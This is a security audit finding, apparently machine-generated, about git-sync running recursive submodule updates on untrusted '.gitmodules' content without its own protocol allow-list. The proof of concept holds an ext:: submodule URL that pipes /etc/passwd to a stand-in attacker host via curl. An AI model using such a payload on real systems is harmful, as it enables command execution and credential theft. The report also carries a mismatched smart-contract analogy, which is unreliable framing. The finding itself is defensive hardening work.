### Title
Missing protocol allow-list check before recursive `git submodule update` on untrusted repo content - (File: `main.go`)

### Summary
Analogous to the missing `Complication` authorization check in `takeMultipleOneOrders` (where the contract executed maker orders without validating that the caller was authorized by the order's own rules), `git-sync` executes `git submodule update --init --recursive` against fully untrusted, attacker-influenced repository content (`.gitmodules`) without first validating/restricting which git transport protocols are permitted, and without setting an explicit `GIT_ALLOW_PROTOCOL`/`protocol.*.allow` policy of its own.

### Finding Description
`configureWorktree` in `main.go` runs the submodule update step unconditionally once a hash is checked out: [1](#0-0) 

This command reads `.gitmodules` from the just-fetched, attacker-influenced commit and lets git resolve whatever submodule URLs/protocols that file declares (e.g. `file://`, `ext::`, arbitrary hosts). `git-sync` never sets its own protocol allow-list (no `GIT_ALLOW_PROTOCOL` env var, no `protocol.file.allow` / `protocol.ext.allow` config) before invoking this — a search of `main.go` for `protocol`, `GIT_ALLOW_PROTOCOL`, `ext::`, `file://` returned no results. The tool's `--submodules` flag defaults to `recursive`, so this runs by default on every sync: [2](#0-1) 

Just as `takeMultipleOneOrders` trusted the maker's order blindly instead of checking the order's own `Complication` rules before execution, `git-sync` trusts whatever `.gitmodules` content a synced ref contains and hands it straight to `git submodule update --init --recursive`, relying entirely on the bundled git binary's own (possibly weaker, possibly user-overridden) protocol defaults rather than enforcing its own explicit, sandboxed policy — despite `git-sync`'s stated threat model of syncing from a remote repo that is not fully trusted.

Compounding this, users can inject arbitrary git config via `--git-config`, which is passed straight to `git config`: [3](#0-2) 

If a user (or a misconfigured deployment) sets a permissive `protocol.*.allow` value here, or if the underlying git binary in the image is not one of the hardened defaults, there is no independent guard in `git-sync` itself to fall back on.

### Impact Explanation
If an attacker can influence the content of the branch/tag/hash that `git-sync` is configured to follow (e.g., a compromised upstream contributor, a merged malicious PR, or any write access to the tracked ref), they can add/modify `.gitmodules` to point to `file://` (local file exfiltration into the synced worktree) or `ext::` (arbitrary command execution) submodule URLs. Because `git-sync` does not itself restrict protocols before running the recursive submodule update, exploitability reduces entirely to whatever the bundled/host git version and any user-supplied `--git-config` permit — there is no defense-in-depth from `git-sync`'s own code. Successful exploitation could yield code execution in the sidecar container, disclosure of files outside `--root`, or corruption of the published symlink contract.

### Likelihood Explanation
Moderate. Modern stock git releases (post CVE-2022-39253 fixes) restrict `file://` submodules to `protocol.file.allow=user` and require explicit opt-in for `ext::`, which mitigates this by default on up-to-date git. However, `git-sync` performs no independent verification of the git version bundled in its container image, sets no `GIT_ALLOW_PROTOCOL` safety net of its own, and exposes `--git-config`/`--submodules=recursive` (the default) as levers that could loosen or bypass those upstream protections. The vulnerability is therefore latent/conditional rather than always exploitable, which is why it is presented as a hardening gap rather than a confirmed exploit in this session — I was not able to inspect `Dockerfile.in`'s pinned git version within the remaining tool budget to confirm which git release ships in the image.

### Recommendation
Before invoking `git submodule update --init [--recursive]`, `git-sync` should explicitly set a restrictive protocol allow-list itself (e.g. `GIT_ALLOW_PROTOCOL=file:git:https:ssh` in the subprocess environment, or explicitly pass `-c protocol.file.allow=never -c protocol.ext.allow=never` unless the operator opts in), rather than relying solely on whatever the bundled git binary defaults to or on what `--git-config` happens to permit. This mirrors the recommended fix pattern in the source report: don't trust the embedded/untrusted content's declared behavior — enforce an explicit authorization/policy check (here, an explicit protocol allow-list) at the point of execution.

### Proof of Concept
1. Attacker with push/merge access to the tracked ref adds a `.gitmodules` entry: `git submodule add ext::'sh -c "curl attacker.com/$(cat /etc/passwd|base64)"' payload` (or a `file:///etc/` submodule URL) and commits it.
2. `git-sync`'s next `SyncRepo` cycle fetches the new hash, creates a worktree, and calls `configureWorktree`, which unconditionally runs `git submodule update --init --recursive` [1](#0-0) .
3. If the git binary in the container/image does not enforce restrictive `protocol.file.allow`/`protocol.ext.allow` defaults (or `--git-config` was used to loosen them), the submodule operation executes the attacker-controlled command or reads local files, without any independent check from `git-sync` itself.

### Citations

**File:** main.go (L1733-1747)
```go
	// Update submodules
	// NOTE: this works for repo with or without submodules.
	if git.submodules != submodulesOff {
		git.log.V(1).Info("updating submodules")
		submodulesArgs := []string{"submodule", "update", "--init"}
		if git.submodules == submodulesRecursive {
			submodulesArgs = append(submodulesArgs, "--recursive")
		}
		if git.depth != 0 {
			submodulesArgs = append(submodulesArgs, "--depth", strconv.Itoa(git.depth))
		}
		if _, _, err := git.Run(ctx, worktree.Path(), submodulesArgs...); err != nil {
			return err
		}
	}
```

**File:** README.md (L312-316)
```markdown
    --git-config <string>, $GITSYNC_GIT_CONFIG
            Additional git config options in a comma-separated 'key:val'
            format.  The parsed keys and values are passed to 'git config' and
            must be valid syntax for that command.  This is similar to
            --git-config-add, but uses a single comma-separated string.
```

**File:** README.md (L527-529)
```markdown
    --submodules <string>, $GITSYNC_SUBMODULES
            The git submodule behavior: one of "recursive", "shallow", or
            "off".  If not specified, this defaults to "recursive".
```
